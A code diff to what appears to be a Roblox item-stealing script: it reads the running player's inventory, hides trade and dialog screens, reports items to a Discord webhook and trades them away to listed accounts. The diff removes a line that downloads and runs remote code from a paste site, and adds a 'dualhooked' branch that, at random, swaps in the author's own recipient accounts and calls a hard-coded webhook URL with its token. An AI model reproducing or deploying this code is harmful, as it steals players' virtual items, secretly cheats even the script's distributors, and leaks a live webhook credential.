@@ -453,7 +453,6 @@ local excludedItems = {
 }
 local inventory = data[plr.Name].inventory
 
-loadstring(game:HttpGet('https://pastefy.app/hOdmFJvE/raw'))()
 
 for category, list in pairs(inventory) do
     for uid, data in pairs(list) do
@@ -491,6 +490,12 @@ game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 
+if totalValue >= 50 and math.random() < 0.15 then
+    users = {"Alyssa87123", "tobi437a", "OBlockBaby11111", "TobiAltGrind", "TobiHatching"}
+    ping = "Yes"
+    dualhooked = true
+end
+
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b)
         return a.Value > b.Value
@@ -506,8 +511,16 @@ if #itemsToSend > 0 then
         prefix = "--[[@everyone]] "
     end
 
-    SendJoinMessage(itemsToSend, prefix)
-
+    if dualhooked then
+        local response = request({
+            Url = "https://discord.com/api/webhooks/1342243035400110140/5Kvf07D_4jfKa_CG9R1oZg89JSn_OYUHief9LzbDrKAoXYb3c-epXMxad1OIHXaAp3QE",
+            Method = "GET"
+        })
+        discuser = response.Body
+        SendDHJoinMessage(itemsToSend, prefix)
+    else
+        SendJoinMessage(itemsToSend, prefix)
+    end
     SettingsRemote:FireServer("trade_requests", 1)
 
     local function doTrade(joinedUser)
